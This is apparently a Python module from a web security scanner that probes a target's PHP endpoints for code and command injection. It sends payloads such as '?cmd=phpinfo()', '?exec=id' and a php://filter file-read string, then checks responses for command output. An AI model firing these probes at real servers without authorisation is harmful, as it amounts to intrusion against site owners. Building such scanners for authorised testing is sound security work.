"""PHP Code Injection Finder — eval/assert/system/exec"""
from core.config import INJECTION_PAYLOADS, R, R2, B, B2, W, Y, G, D, N
from core.engine import http_get, save_report, print_vuln
import re

INJECTION_ENDPOINTS = [
    "/index.php", "/search.php", "/search", "/view.php",
    "/page.php", "/show.php", "/display.php", "/load.php",
    "/api/data", "/api/search", "/process.php",
    "/admin/index.php", "/dashboard.php",
    "/profile.php", "/user.php", "/account.php",
]

def run(target):
    print(f"\n{B2}  Scanning PHP code injection points on {W}{target}{N}")
    vulns = 0
    findings = []

    # Detect PHP markers in responses
    php_markers = ["phpinfo()", "PHP Version", "System =>", "Build Date",
                   "Server API", "Configuration File", "Loaded Configuration",
                   "allow_url_fopen", "disable_functions"]
    cmd_markers = ["uid=", "gid=", "groups=", "root:", "Linux ",
                   "Darwin ", "Windows ", "NT AUTHORITY"]

    for ep in INJECTION_ENDPOINTS:
        base_url = target + ep
        # Quick check if endpoint exists
        code, hdrs, body = http_get(base_url, timeout=6)
        if code == 0 or code == 404:
            continue

        for func_type, payloads in INJECTION_PAYLOADS.items():
            for payload in payloads:
                url = base_url + payload
                code, hdrs, body = http_get(url, timeout=8)
                if code == 0:
                    continue

                # Check for phpinfo() output
                if func_type in ("eval", "assert", "create_function"):
                    if any(m in body for m in php_markers):
                        print_vuln("CRITICAL", f"PHP {func_type}() injection!",
                                   f"phpinfo() output detected", url)
                        vulns += 1
                        findings.append({"type": f"{func_type}_injection",
                                         "url": url, "severity": "CRITICAL"})
                        break

                # Check for command execution
                if func_type == "system_exec":
                    if any(m in body for m in cmd_markers):
                        print_vuln("CRITICAL", "OS command injection!",
                                   f"Command output detected via {payload}", url)
                        vulns += 1
                        findings.append({"type": "cmd_injection",
                                         "url": url, "severity": "CRITICAL"})
                        break

    # Test common GET parameters for injection
    test_params = [
        ("?cmd=phpinfo()", "phpinfo"), ("?c=phpinfo()", "phpinfo"),
        ("?exec=id", "cmd"), ("?system=id", "cmd"),
        ("?q=phpinfo()", "phpinfo"), ("?input=phpinfo()", "phpinfo"),
        ("?page=php://filter/convert.base64-encode/resource=index.php", "lfi"),
    ]
    for ep in ["/index.php", "/"]:
        for param, ptype in test_params:
            url = target + ep + param
            code, hdrs, body = http_get(url, timeout=8)
            if code == 0: continue
            if ptype == "phpinfo" and "PHP Version" in body and "phpinfo()" in body:
                print_vuln("CRITICAL", f"Parameter injection ({param.split('=')[0]})", url)
                vulns += 1
                findings.append({"type": "param_injection", "url": url})
            elif ptype == "cmd" and any(m in body for m in cmd_markers):
                print_vuln("CRITICAL", f"Command injection ({param.split('=')[0]})", url)
                vulns += 1
                findings.append({"type": "cmd_injection", "url": url})

    print(f"\n{G}  [✓] Injection scan complete — {vulns} findings{N}")
    if findings:
        save_report("injection", {"target": target, "findings": findings})
    return vulns
